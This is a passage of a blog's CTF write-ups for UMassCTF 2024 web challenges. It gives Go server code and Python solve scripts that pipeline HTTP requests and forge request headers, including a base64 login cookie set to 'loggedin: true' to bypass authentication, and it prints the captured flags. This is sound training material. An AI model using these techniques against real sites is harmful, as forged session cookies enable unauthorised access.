+</span></span><span class="line"><span class="cl">			<span class="nx">r</span><span class="p">.</span><span class="nf">generateResponse</span><span class="p">(</span><span class="s">&#34;burger added&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="nx">uri</span> <span class="o">==</span> <span class="s">&#34;/flag&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">r</span><span class="p">.</span><span class="nx">burgers</span> <span class="o">&gt;=</span> <span class="mi">100</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">r</span><span class="p">.</span><span class="nf">generateResponse</span><span class="p">(</span><span class="s">&#34;fmt.Sprintf(&#34;</span><span class="nx">Flag</span><span class="p">:</span> <span class="nx">UMASS</span><span class="p">{</span><span class="o">%</span><span class="nx">s</span><span class="p">}</span><span class="s">&#34;, os.Getenv(&#34;</span><span class="nx">FLAG</span><span class="s">&#34;)&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">r</span><span class="p">.</span><span class="nf">generateResponse</span><span class="p">(</span><span class="s">&#34;Not enough burgers&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">r</span><span class="p">.</span><span class="nf">generateResponse</span><span class="p">(</span><span class="s">&#34;Not found&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">r</span> <span class="o">*</span><span class="nx">RequestHandler</span><span class="p">)</span> <span class="nf">generateResponse</span><span class="p">(</span><span class="nx">message</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nx">conn</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n%s\nburgers: %d\n&#34;</span><span class="p">,</span> <span class="nx">message</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">burgers</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">readHTTPHeader</span><span class="p">(</span><span class="nx">reader</span> <span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Reader</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Read headers until \r\n\r\n
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">requestLines</span> <span class="p">[]</span><span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">line</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">reader</span><span class="p">.</span><span class="nf">ReadString</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">requestLines</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">requestLines</span><span class="p">,</span> <span class="nx">line</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Check if the current line marks the end of the headers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="nx">line</span> <span class="o">==</span> <span class="s">&#34;\r\n&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">requestLines</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">),</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>solve.py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;crabby-clicker.ctf.umasscybersec.org&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>            
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># clicker</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Burger:&#34;</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;GET /click HTTP/1.1</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Host: </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;GET /flag HTTP/1.1</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Host: </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag: <strong>UMASS{y_w0uld_u_w4nt_mult1p13_r3qu35t5}</strong></p>
+<hr>
+<h1 id="webholesome-birthday-party" class="headerLink">
+    <a href="#webholesome-birthday-party" class="header-mark"></a>web/Holesome Birthday Party</h1><p>Sponbebob&rsquo;s birthday party invitation. It requires specific headers to enter. When we first view the webpage, it said requires a <code>User-Agent</code>. We can see the requirements/hints in the response as we progress.</p>
+<p>Challenges:</p>
+<ol>
+<li>CONGRATS, you got invited to my birthday party! To gain your ticket for entrance, you must first prove that your browser is from &ldquo;Bikini Bottom&rdquo;!</li>
+<li>Good to see you here, mate. Sorry, but you&rsquo;re too early for the Spongebob Squarepant&rsquo;s birthday party!</li>
+<li>Bravo! You made it just on time! But… I’ve been trying to learn French… can you speak French?</li>
+<li>C’est très chouette! Suddenly I really miss my great-grandma (இ﹏இ`｡) Can you get me some cookies? I want a cookie with the &ldquo;flavor&rdquo; of &ldquo;chocolate_chip&rdquo;</li>
+<li>So yummy! I now grant you the ticket of entrance to the party, but can you find your way in? .</li>
+</ol>
+<blockquote>
+<p>For challenge 5, The response sets a cookie to <code>Login=base64({&quot;loggedin&quot;: false})</code>. Looks like it needs to be set to true</p>
+</blockquote>
+<p>solve.py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span> 
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># spongebob birthday</span>
+</span></span><span class="line"><span class="cl"><span class="n">date_obj</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="n">year</span><span class="o">=</span><span class="mi">2024</span><span class="p">,</span> <span class="n">month</span><span class="o">=</span><span class="mi">7</span><span class="p">,</span> <span class="n">day</span><span class="o">=</span><span class="mi">14</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">date_str</span> <span class="o">=</span> <span class="n">date_obj</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%a</span><span class="s1">, </span><span class="si">%d</span><span class="s1"> %b %Y %H:%M:%S GMT&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># chall 5</span>
+</span></span><span class="line"><span class="cl"><span class="n">login_cookie</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="s1">&#39;{&#34;loggedin&#34;: true}&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Bikini Bottom&#34;</span><span class="p">,</span> <span class="c1"># chall 1</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Date&#34;</span><span class="p">:</span> <span class="n">date_str</span><span class="p">,</span> <span class="c1"># chall 2</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7&#34;</span><span class="p">,</span> <span class="c1"># chall 3</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;flavor=chocolate_chip; Login=</span><span class="si">{</span><span class="n">login_cookie</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="c1"># chall 4-5</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://holesomebirthdayparty.ctf.umasscybersec.org/&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><a class="lightgallery" href="/umass-ctf-2024/holesome.png" title="/umass-ctf-2024/holesome.png" data-thumbnail="/umass-ctf-2024/holesome.png">
+        <img
+            
+            loading="lazy"
+            src="/umass-ctf-2024/holesome.png"
+            srcset="/umass-ctf-2024/holesome.png, /umass-ctf-2024/holesome.png 1.5x, /umass-ctf-2024/holesome.png 2x"
+            sizes="auto"
+            alt="/umass-ctf-2024/holesome.png" height="40"  width="100%" >
+    </a>
+<p>flag: <strong>UMASS{B3k3nIwH3rLP0oL~}</strong></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-04-22</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="https://xeunwa.github.io/umass-ctf-2024/" data-title="UMassCTF 2024 - web(3x) writeups" data-hashtags="Header Injection,Command Injection,Code Review,Go"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Instapaper" data-sharer="instapaper" data-url="https://xeunwa.github.io/umass-ctf-2024/" data-title="UMassCTF 2024 - web(3x) writeups" data-description="CMD injection, HTTP, Header injection"><span data-svg-src="/lib/simple-icons/icons/instapaper.min.svg"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/header-injection/">Header Injection</a>,&nbsp;<a href="/tags/command-injection/">Command Injection</a>,&nbsp;<a href="/tags/code-review/">Code Review</a>,&nbsp;<a href="/tags/go/">Go</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/b01lers-2024/" class="prev" rel="prev" title="b01lers CTF 2024 - writeups"><i class="fas fa-angle-left fa-fw"></i>b01lers CTF 2024 - writeups</a>
+            <a href="/umdctf-2024/" class="next" rel="next" title="UMDCTF 2024 - web(2x) writeups">UMDCTF 2024 - web(2x) writeups<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.131.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"data":{"desktop-header-typeit":"xeunwa","mobile-header-typeit":"xeunwa"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":300,"threshold":0.1,"type":"fuse","useExtendedSearch":false},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
